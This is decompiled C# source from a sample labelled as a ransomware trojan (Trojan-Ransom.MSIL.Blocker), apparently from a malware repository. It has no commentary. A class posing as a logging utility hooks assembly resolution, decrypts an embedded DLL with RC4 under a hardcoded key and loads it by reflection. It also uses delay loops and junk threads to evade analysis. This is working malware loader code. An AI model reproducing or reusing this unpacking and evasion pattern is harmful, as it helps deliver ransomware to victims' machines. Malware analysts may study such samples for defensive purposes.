// Decompiled with JetBrains decompiler
// Type: ax1667.Filter.Consumer
// Assembly: ax1667, Version=6.3.2.0, Culture=neutral, PublicKeyToken=null
// MVID: EB936427-12B3-4150-9CAD-9C4487701485
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-44423c3d0ea20964dc8918929e6fa588396b3ce654798022506852cd9b60aa3c.exe

using Microsoft.CSharp.RuntimeBinder;
using Qgxjrevgwqeux;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

namespace ax1667.Filter
{
  public class Consumer
  {
    private readonly object value = new object();
    private readonly string connection;
    private readonly string _Mock;

    public Consumer()
    {
      for (int index1 = 0; index1 < 22; ++index1)
      {
        Thread.Sleep(1000);
        new Thread((ThreadStart) (() =>
        {
          for (int index2 = 0; index2 < 99; ++index2)
            Console.WriteLine(index2);
        })).Start();
      }
      this.connection = "yyyy-MM-dd HH:mm:ss.fff";
      this._Mock = Assembly.GetExecutingAssembly().GetName().Name + ".log";
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(this.ReflectConfiguration);
      string str = this._Mock + " is created.";
      if (!File.Exists(this._Mock))
        return;
      this.CreateConfiguration(DateTime.Now.ToString(this.connection) + " " + str);
    }

    public void InvokeConfiguration(string i) => this.VerifyConfiguration((Consumer.InsertionMode) 2, i);

    public void InstantiateConfiguration(string first) => this.VerifyConfiguration((Consumer.InsertionMode) 4, first);

    public void AddConfiguration(string config) => this.VerifyConfiguration((Consumer.InsertionMode) 5, config);

    public void FlushConfiguration(string key) => this.VerifyConfiguration((Consumer.InsertionMode) 1, key);

    public void PrintConfiguration(string value) => this.VerifyConfiguration((Consumer.InsertionMode) 0, value);

    public void PopConfiguration(string def) => this.VerifyConfiguration((Consumer.InsertionMode) 3, def);

    private void CreateConfiguration(string instance, bool isvisitor = false)
    {
      try
      {
        if (string.IsNullOrEmpty(instance))
          return;
        lock (this.value)
        {
          using (StreamWriter streamWriter = new StreamWriter(this._Mock, isvisitor, Encoding.UTF8))
            streamWriter.WriteLine(instance);
        }
      }
      catch
      {
        throw;
      }
    }

    private void VerifyConfiguration(Consumer.InsertionMode param, string ord)
    {
      string str;
      switch (param)
      {
        case (Consumer.InsertionMode) 0:
          str = DateTime.Now.ToString(this.connection) + " [TRACE]   ";
          break;
        case (Consumer.InsertionMode) 1:
          str = DateTime.Now.ToString(this.connection) + " [INFO]    ";
          break;
        case (Consumer.InsertionMode) 2:
          str = DateTime.Now.ToString(this.connection) + " [DEBUG]   ";
          break;
        case (Consumer.InsertionMode) 3:
          str = DateTime.Now.ToString(this.connection) + " [WARNING] ";
          break;
        case (Consumer.InsertionMode) 4:
          str = DateTime.Now.ToString(this.connection) + " [ERROR]   ";
          break;
        case (Consumer.InsertionMode) 5:
          str = DateTime.Now.ToString(this.connection) + " [FATAL]   ";
          break;
        default:
          str = "";
          break;
      }
      this.CreateConfiguration(str + ord, true);
    }

    public string VisitConfiguration()
    {
      try
      {
        object instance = Activator.CreateInstance(typeof (ClassLibrary));
        // ISSUE: reference to a compiler-generated field
        if (Consumer.\u003C\u003Eo__13._Item == null)
        {
          // ISSUE: reference to a compiler-generated field
          Consumer.\u003C\u003Eo__13._Item = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.None, typeof (string), typeof (Consumer)));
        }
        // ISSUE: reference to a compiler-generated field
        Func<CallSite, object, string> target = Consumer.\u003C\u003Eo__13._Item.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, string>> callSite = Consumer.\u003C\u003Eo__13._Item;
        // ISSUE: reference to a compiler-generated field
        if (Consumer.\u003C\u003Eo__13.m_Descriptor == null)
        {
          // ISSUE: reference to a compiler-generated field
          Consumer.\u003C\u003Eo__13.m_Descriptor = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.None, "Data", (IEnumerable<Type>) null, typeof (Consumer), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj = Consumer.\u003C\u003Eo__13.m_Descriptor.Target((CallSite) Consumer.\u003C\u003Eo__13.m_Descriptor, instance);
        return target((CallSite) callSite, obj);
      }
      catch
      {
        Environment.Exit(0);
      }
      return (string) null;
    }

    private byte[] NewConfiguration(byte[] var1)
    {
      int[] numArray1 = new int[256];
      int[] numArray2 = new int[256];
      byte[] numArray3 = new byte[var1.Length];
      byte[] bytes = Encoding.UTF8.GetBytes("Wdvqrnpueiyv");
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (int) bytes[index % bytes.Length];
        numArray2[index] = index;
      }
      int index1;
      for (int index2 = index1 = 0; index1 < 256; ++index1)
      {
        index2 = (index2 + numArray2[index1] + numArray1[index1]) % 256;
        int num = numArray2[index1];
        numArray2[index1] = numArray2[index2];
        numArray2[index2] = num;
      }
      new Thread((ThreadStart) (() =>
      {
        for (int index3 = 0; index3 < 999999; ++index3)
          Console.WriteLine(index3);
      })).Start();
      int num1;
      int index4 = num1 = 0;
      int index5 = num1;
      int index6 = num1;
      for (; index4 < var1.Length; ++index4)
      {
        index6 = (index6 + 1) % 256;
        index5 = (index5 + numArray2[index6]) % 256;
        int num2 = numArray2[index6];
        numArray2[index6] = numArray2[index5];
        numArray2[index5] = num2;
        int num3 = numArray2[(numArray2[index6] + numArray2[index5]) % 256];
        numArray3[index4] = (byte) ((uint) var1[index4] ^ (uint) num3);
      }
      return numArray3;
    }

    private Assembly ReflectConfiguration(object config, ResolveEventArgs map)
    {
      string name = "Llfwvpucq.Qgxjrevgwqeux.dll";
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
      byte[] numArray = new byte[manifestResourceStream.Length];
      manifestResourceStream.Read(numArray, 0, numArray.Length);
      new Thread((ThreadStart) (() =>
      {
        for (int index = 0; index < 999; ++index)
          Console.WriteLine(index);
      })).Start();
      return (Assembly) typeof (Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, (System.Reflection.Binder) null, (object) null, new object[1]
      {
        (object) this.NewConfiguration(numArray)
      });
    }

    [System.Flags]
    private enum InsertionMode
    {
    }
  }
}
